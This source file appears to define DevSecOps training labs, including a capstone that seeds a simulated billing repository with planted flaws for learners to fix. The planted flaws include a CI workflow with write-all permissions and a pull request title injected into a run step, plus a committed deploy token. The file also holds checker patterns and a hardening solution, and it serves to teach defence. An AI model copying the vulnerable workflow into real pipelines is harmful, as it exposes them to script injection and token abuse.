      "gh api -X PATCH repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts/1 -f state=resolved -f resolution=revoked -f resolution_comment='Key revoked and replaced; history rewritten.'"),
    debrief: "<p>The order held: the leaked key was dead within minutes of you looking, and CI was back on a fresh key before you started digging. The audit trail then told the real story: an unknown address used the key ten hours after it was pushed, listed the projects and started an export. Without containment first, that could still be happening.</p><p>Your notes turn this from \"something happened\" into a timeline someone else can act on (the export is a follow-up). And the cleanup closed the loop: the key is gone from the public history, and the alert says <i>revoked</i>, which is the only resolution that means \"safe\".</p>",
    realworld: "GitHub, AWS, Slack and others revoke some leaked tokens automatically when they're pushed to public repositories (secret scanning partner program). Your company's own keys only get that protection if you add a custom pattern, as Kestrel did.",
    quiz: [
      { q: "You discover a leaked key. What comes first?", options: ["Find out who leaked it", "Revoke it (contain), then investigate", "Rewrite history", "Write the post-mortem"], answer: 1, why: "Every minute it works is attacker time. Investigation reads logs that don't go away." },
      { q: "Which secret scanning resolution means the danger is gone?", options: ["wont_fix", "false_positive", "revoked", "used_in_tests"], answer: 2, why: "Revoked: the secret no longer works anywhere." },
      { q: "Why pipe the new key into gh secret set instead of using --body KEY?", options: ["It's shorter", "So the key never appears in your shell history or on screen", "--body is deprecated", "Pipes are encrypted"], answer: 1, why: "Command lines are recorded; stdin isn't." }
    ]
  });

  /* ================================================================== GT-136 Capstone: harden the Kestrel repo */
  var PAY_PKG = { name: "kestrel-payments", version: "0.8.0", private: true, description: "Billing API", scripts: { test: "bash test/run.sh" }, engines: { node: ">=22" }, dependencies: { express: "^4.18.2" } };
  var PAY_TEST = "#!/bin/bash\n# Smoke test: the service file exists and declares its routes.\nset -e\ngrep -q 'app.get(\"/health\"' server.js\ngrep -q 'app.post(\"/invoices\"' server.js\necho \"payments smoke test ok\"\n";
  var PAY_CI = "name: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\npermissions: write-all\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo \"Testing: ${{ github.event.pull_request.title }}\"\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n      - run: npm ci\n      - run: npm test\n      - uses: notify-hub/slack-notify@v2\n        with:\n          webhook-url: ${{ secrets.SLACK_WEBHOOK }}\n          message: payments CI passed\n";
  T.M4.PAY_CI = PAY_CI;
  function capWorld(sys) {
    world(sys);
    A.installNode(sys);
    var tok = A.deployToken(sys, "kestrel-payments", "production");
    sys.lab = { tok: tok, blob: sshKey(sys) };
    var files = { "README.md": "# kestrel-payments\n\nKestrel's billing API.\n", "package.json": JSON.stringify(PAY_PKG, null, 2) + "\n", "package-lock.json": A.lockFor(PAY_PKG, { express: "4.18.2" }), ".gitignore": "node_modules/\n",
      "server.js": "const express = require(\"express\");\nconst app = express();\n\napp.get(\"/health\", (req, res) => res.json({ ok: true }));\napp.post(\"/invoices\", (req, res) => res.status(201).json({ id: 1 }));\n\napp.listen(3000);\n", "test/run.sh": PAY_TEST, ".github/workflows/ci.yml": PAY_CI };
    GH.seed(sys, "kestrel/kestrel-payments", { steps: [
      { msg: "Billing API skeleton", by: "maya", at: "2026-09-01 10:00", files: files, exec: ["test/run.sh"] },
      { msg: "Add deploy config", by: "ben", at: "2026-09-20 10:00", files: { "config/deploy.env": "SITE=kestrel-payments\nDEPLOY_TOKEN=" + tok + "\n" } },
      { msg: "Move deploy config to the vault", by: "ben", at: "2026-09-21 10:00", files: { "config/deploy.env": null } },
      { msg: "Invoices endpoint", by: "ana", at: "2026-10-02 10:00", files: { "docs/api.md": "# API\n\n- GET /health\n- POST /invoices\n" } }
    ] }, { private: true, description: "Billing API" });
    var r = GH.find(sys, "kestrel/kestrel-payments");
    r.collab["kc-dev"] = "admin";
    GH.user(sys, "sam-intern", { name: "Sam Lee", email: "sam@kestrel.io" });
    r.collab["sam-intern"] = "admin";
    r.settings.actionsPermissions = "write";
    r.secrets.SLACK_WEBHOOK = { value: A.chatHook(sys, "#payments"), updated: G.clock(sys) - 86400 * 20 };
    GH.cloneTo(sys, "kestrel/kestrel-payments", HOME + "/kestrel-payments");
  }
  var CAP_CI = PAY_CI.replace("permissions: write-all", "permissions:\n  contents: read").replace("      - run: echo \"Testing: ${{ github.event.pull_request.title }}\"\n", "      - run: echo \"Testing: $TITLE\"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n");
  function capCI(sha) { return CAP_CI.replace("notify-hub/slack-notify@v2", "notify-hub/slack-notify@" + sha + " # v2.3.1"); }
  LABS.push({
    id: "gt-136", n: 36, module: 4, ticket: "GT-136", xp: 320, capstone: true,
    title: "Harden the Kestrel repo",
    topic: "Module 4 capstone",
    from: DEV,
    story: "<p>Before <code>kestrel/kestrel-payments</code> (the billing API, cloned in <code>~/kestrel-payments</code>) handles real money, it needs everything from this module. You're an admin. Your SSH key (<code>~/.ssh/id_ed25519</code>) is set up for pushing.</p>" +
      '<table class="t"><tr><th>Done means</th></tr>' +
      "<tr><td>the <b>deploy token</b> once committed to this repository is revoked, and no commit on GitHub contains it any more</td></tr>" +
      "<tr><td>secret scanning, push protection and Dependabot alerts are on, and <b>no Dependabot alert is open</b></td></tr>" +
      "<tr><td>the pipeline is locked down: read-only default token, no <code>write-all</code>, third-party actions pinned to a commit SHA, no <code>${{ github.event.* }}</code> injected into <code>run:</code></td></tr>" +
      "<tr><td><code>main</code> requires <b>signed commits</b>, and its newest commit is Verified</td></tr>" +
      "<tr><td>a shared <b>pre-commit hook</b> runs <code>gitleaks protect --staged</code> (in <code>.githooks/</code>, executable) and your clone uses it</td></tr>" +
      "<tr><td>nobody has access who shouldn't (the summer intern left in September)</td></tr></table>",
    learn: "<p>Everything from this module, in one repository. Think about the order: a history rewrite changes every commit (and drops signatures), so do it before requiring signed commits; rotate the token before rewriting; fix vulnerable dependencies on <code>main</code> and check the alerts afterwards. Tools: <code>gitleaks</code>, <code>git filter-repo</code>, <code>gh api</code>, <code>gh repo edit</code>, <code>npm install</code>, and the commands from GT-128 to GT-135.</p>",
    system: capWorld,
    starter: "",
    objectives: [
      {
        id: "secret", hints: [], text: "The old deploy token is revoked and gone from every commit on GitHub.",
        check: function (r) { var t = A.svc(r.sys).tokens[r.sys.lab.tok]; if (!t || !t.revoked) return "The deploy token in the history still works: revoke it first (deploy.kestrel.io/api/tokens/self)."; return historyHas(r, "kestrel/kestrel-payments", r.sys.lab.tok) ? "A commit on GitHub still contains the token." : true; }
      },
      {
        id: "scan", hints: [], text: "Secret scanning, push protection and Dependabot alerts are on, and no Dependabot alert is open.",
        check: function (r) {
          var x = gh(r, "kestrel/kestrel-payments"), s = x.settings, miss = [];
          if (!s.secretScanning) miss.push("secret scanning"); if (!s.pushProtection) miss.push("push protection"); if (!s.dependabotAlerts) miss.push("Dependabot alerts");
          if (miss.length) return "Still off: " + miss.join(", ") + ".";
          SEC.depScan(r.sys, x);
          var open = x.alerts.dependabot.filter(function (a) { return a.state === "open"; });
          return open.length ? "Open Dependabot alerts: " + open.map(function (a) { return a.pkg + " " + a.version; }).join(", ") + "." : true;
        }
      },
      {
        id: "pipeline", hints: [], text: "Read-only default token, no write-all, third-party actions pinned by SHA, no injection.",
        check: function (r) {
          var x = gh(r, "kestrel/kestrel-payments");
          if (x.settings.actionsPermissions !== "read") return "The repository's default workflow token should be read-only.";
          var probs = [];
          wfsOn(r, "kestrel/kestrel-payments", "main").forEach(function (w) {
            if (w.errors.length) { probs.push(w.file + " is invalid"); return; }
            if (/write-all/.test(w.text)) probs.push(w.file + " uses write-all");
            Object.keys(jobsOf(w)).forEach(function (k) { steps(jobsOf(w)[k]).forEach(function (s) {
              if (s && s.uses && !/^(actions|github)\//.test(String(s.uses)) && !/@[0-9a-f]{40}$/.test(String(s.uses))) probs.push(s.uses + " isn't pinned to a commit SHA");
              if (s && s.run !== undefined && /\$\{\{\s*github\.event\./.test(String(s.run))) probs.push(w.file + " injects ${{ github.event... }} into a run: step");
            }); });
          });
          return probs.length ? probs[0] + "." : true;
        }
      },
      {
        id: "signed", hints: [], text: "<code>main</code> requires signed commits and its newest commit is Verified.",
        check: function (r) { var x = gh(r, "kestrel/kestrel-payments"), v = GH.verify(r.sys, x.refs["refs/heads/main"]); if (!v.verified) return "main's newest commit isn't Verified (" + v.reason + ")."; return x.protect.main && x.protect.main.signatures ? true : "Require signed commits on main."; }
      },
      {
        id: "hook", hints: [], text: "A shared, executable pre-commit hook runs gitleaks, and your clone uses it.",
        check: function (r) {
          var t = fileOn(r, "kestrel/kestrel-payments", "main", ".githooks/pre-commit");
          if (t === null || !/gitleaks\s+protect\b[^\n]*--staged/.test(t)) return "main needs .githooks/pre-commit running gitleaks protect --staged.";
          if (modeOn(r, "kestrel/kestrel-payments", "main", ".githooks/pre-commit") !== "100755") return "The hook must be executable in the repository.";
          var v = [repo(r, "kestrel-payments"), repo(r, "kestrel-payments-clean"), repo(r, "payments-clean")].filter(Boolean);
          return v.some(function (x) { return cfgLocal(x, "core.hooksPath") === ".githooks"; }) ? true : "Point your clone at it: git config core.hooksPath .githooks";
        }
      },
      {
        id: "access", hints: [], text: "Nobody has access who shouldn't.",
        check: function (r) { var x = gh(r, "kestrel/kestrel-payments"); return x.collab["sam-intern"] ? "sam-intern still has " + x.collab["sam-intern"] + " access." : true; }
      }
    ],
    solution: sol("cd ~/kestrel-payments", "sudo apt install -y gitleaks git-filter-repo", "gitleaks detect -v",
      "curl -fsS -X DELETE -H \"Authorization: Bearer $(git show $(git log --all --format=%h -- config/deploy.env | tail -1):config/deploy.env | grep DEPLOY_TOKEN | cut -d= -f2)\" https://deploy.kestrel.io/api/tokens/self",
      "cd ~", "git clone https://github.com/kestrel/kestrel-payments.git kestrel-payments-clean", "cd kestrel-payments-clean", "git filter-repo --invert-paths --path config/deploy.env",
      "git remote add origin https://github.com/kestrel/kestrel-payments.git", "git push --force --all origin", "git push -u origin main", "gitleaks detect",
      "gh api -X DELETE repos/kestrel/kestrel-payments/collaborators/sam-intern",
      "gh repo edit --enable-secret-scanning --enable-secret-scanning-push-protection", "gh api -X PUT repos/kestrel/kestrel-payments/vulnerability-alerts",
      "gh api repos/kestrel/kestrel-payments/dependabot/alerts --jq '.[] | [.number, .dependency.package.name, .security_vulnerability.first_patched_version.identifier]'",
      "gh api -X PUT repos/kestrel/kestrel-payments/actions/permissions/workflow -f default_workflow_permissions=read",
      "git config --global gpg.format ssh", "git config --global user.signingkey ~/.ssh/id_ed25519.pub", "git config --global commit.gpgsign true", "gh ssh-key add ~/.ssh/id_ed25519.pub --type signing --title 'kc-dev-01 signing'",
      "sed -i 's/\"express\": \"^4.18.2\"/\"express\": \"^4.19.2\"/' package.json", "npm install", "npm test",
      { nano: ".github/workflows/ci.yml", text: CAP_CI }, "sed -i \"s|notify-hub/slack-notify@v2|notify-hub/slack-notify@$(gh api repos/notify-hub/slack-notify/git/ref/tags/v2.3.1 --jq .object.sha) # v2.3.1|\" .github/workflows/ci.yml",
      "mkdir -p .githooks", { nano: ".githooks/pre-commit", text: HOOK }, "chmod +x .githooks/pre-commit", "git config core.hooksPath .githooks",
      "git add -A", "git commit -m 'Harden the repository: patched express, locked-down CI, shared gitleaks hook'", "git push",
      "gh api repos/kestrel/kestrel-payments/commits/$(git rev-parse HEAD) --jq .commit.verification.verified",
      "nano /tmp/protect.json", "    {\"required_status_checks\": null, \"enforce_admins\": true, \"required_pull_request_reviews\": null, \"restrictions\": null}",
      "gh api -X PUT repos/kestrel/kestrel-payments/branches/main/protection --input /tmp/protect.json", "gh api -X POST repos/kestrel/kestrel-payments/branches/main/protection/required_signatures",
      "gh api repos/kestrel/kestrel-payments/dependabot/alerts --jq '.[] | [.number, .state]'", "gh run list -L 2"),
    debrief: "<p><b>Module 4 complete, and with it the Git &amp; GitHub track.</b> <code>kestrel-payments</code> went from \"a token in its history and an intern with admin\" to: no live secrets anywhere, GitHub watching for new ones (and blocking them at push), patched dependencies with alerts that close themselves, a pipeline whose tokens can barely do anything and whose third-party code can't change under it, commits that prove who made them, a hook that stops mistakes on every laptop, and only the people who should have access.</p><p>That's what DevSecOps looks like day to day: not one big tool, but a dozen small defaults that make the safe path the easy one. Everything you used here works the same on real GitHub.</p>",
    realworld: "OpenSSF Scorecard (github.com/ossf/scorecard) grades a repository on exactly these practices: branch protection, pinned dependencies, token permissions, signed releases, and more. Run it on a project you care about.",
    quiz: []
  });

  LABS.forEach(function (l) { l.drills = []; T.LABS.push(l); });
  T.UPCOMING = T.UPCOMING.filter(function (row) { return row.module !== 4; });
})();
